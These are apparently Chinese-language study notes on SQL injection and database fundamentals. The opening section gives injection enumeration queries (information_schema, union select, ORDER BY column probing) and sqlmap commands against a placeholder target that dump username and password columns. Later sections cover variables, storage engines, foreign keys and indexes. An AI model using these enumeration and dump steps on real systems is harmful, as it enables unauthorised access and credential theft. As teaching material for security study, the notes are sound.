# SQL注入与数据库

## `SQL` 注入

常见爆破步骤：

1. 判断是否存在 `SQL` 注入点。
2. 利用 `database()` 获取当前库名。
3. 利用 `information_schema` 枚举当前数据库中的表。
4. 拿到表名后，继续枚举列名。

常见查询语句：

```sql
select table_name
from information_schema.tables
where table_schema = database();

select column_name
from information_schema.columns
where table_name = '要查的表名';
```

### `sqlmap`

`sqlmap` 常见参数如下：

1. `-u`：指定目标 `URL`
2. `--dbs`：列出目标站点可枚举到的数据库
3. `--current-db`：列出当前数据库
4. `-D dbname`：指定数据库名称
5. `--tables`：列出数据库中的表
6. `-T tablename`：指定数据表
7. `--columns`：列出指定表中的列
8. `-C id,username,password`：指定列名
9. `--dump`：导出字段内容

示例：

```bash
sqlmap -u "http://target/item.php?id=1" --dbs
sqlmap -u "http://target/item.php?id=1" --current-db
sqlmap -u "http://target/item.php?id=1" -D dbname --tables
sqlmap -u "http://target/item.php?id=1" -D dbname -T tablename --columns
sqlmap -u "http://target/item.php?id=1" -D dbname -T tablename -C id,username,password --dump
```

## 数据库与注入常用知识

### 注释

![](../../attachments/7dc98a6eefb9e0f2514d0b470962f4b3.png)

### 常用查询

```sql
union select ...
user()
database()
@@version
@@datadir
```

含义说明：

1. `user()`：当前数据库用户
2. `database()`：当前数据库名
3. `@@version`：数据库版本
4. `@@datadir`：数据库数据目录

### 局部变量与全局变量

`@` 通常表示局部变量，如果没有 `@`，通常表示列名或普通标识符。

示例：

```sql
declare @name varchar(8);
set @name = '张三';
select * from stuInfo where stuName = @name;
```

补充：

1. `set` 和 `select` 都可以用于赋值。
2. `@@error` 等属于系统定义的全局变量，一般只读。

### `ORDER BY`

在注入场景里，`ORDER BY` 常被用于试探列数，也可结合二分法思路缩小范围。

示例：

```sql
order by 1
order by a, b
order by a, b desc
order by a desc, b
order by a desc, b desc
```

说明：

1. `order by 1` 表示按结果集的第 `1` 列排序。
2. `asc` 是升序，通常可省略。
3. `desc` 是降序。

## 数据库结构

### 创建数据库与表

创建数据库：

```sql
CREATE DATABASE websecurity;
```

设计数据表时，通常会考虑以下字段属性：

1. `AUTO_INCREMENT`
2. `PRIMARY KEY`
3. `COMMENT`

示意图：

![](../../attachments/bba22799c1c0040134dfe9025ebec076.png)

常见 `MySQL` 存储引擎：

1. `InnoDB`
2. `MyISAM`

一般来说，`InnoDB` 更适合频繁写入与事务场景，`MyISAM` 在旧环境中常见于偏读场景。

设置存储引擎示例：

```sql
ALTER TABLE `wp_posts` ENGINE = MyISAM;
```

### 外键

示例：

```sql
foreign key (repo_id) references repo_table(repo_id)
```

假设 `repo_id` 在 `repo_table` 中是主键，在 `company_table` 中是外键，则约束效果包括：

1. `company_table` 中插入不存在于 `repo_table` 的 `repo_id` 时，数据库不允许插入。
2. 如果 `repo_table` 中的 `id` 仍被引用，则修改或删除会失败。

### 索引

索引的作用是在一定条件下提高检索速度，尤其适合出现在 `where`、排序、连接等关键路径中的字段。

注意事项：

1. 需要建索引的字段，通常应出现在 `where` 条件中。
2. 数据量较小的字段不一定适合单独建索引，因为索引本身也有维护成本。
3. `where` 条件中是 `OR` 关系时，索引未必能有效命中。
4. 联合索引通常比多个单列索引更节省空间，但字段顺序非常重要。

参考链接：

[联合索引说明 - 博客园](https://www.cnblogs.com/musings/p/10890563.html)

## 修订说明

1. 将原文中的 `information_shema` 更正为 `information_schema`。
2. 将原文中“`-u` 表示全自动注入检测”的表述更正为“`-u` 用于指定目标 `URL`”。
